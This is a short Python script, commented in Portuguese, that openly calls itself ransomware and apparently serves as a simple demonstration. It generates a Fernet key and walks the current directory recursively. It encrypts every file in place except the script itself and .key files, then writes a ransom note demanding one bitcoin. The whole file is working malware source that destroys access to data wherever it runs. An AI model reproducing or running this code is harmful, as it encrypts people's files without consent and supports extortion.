from cryptography.fernet import Fernet 
import os

# Gera a chave
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# Carrega a chave
def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografa um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# Encontrar os arquivos para criptografar
def encontra_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA-ME.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados\n")

# Execução do código
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontra_arquivos(".")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados!")

if __name__ == "__main__":
    main()

#
# python -m venv .venv
# .\.venv\Scripts\activate
# pip install cryptography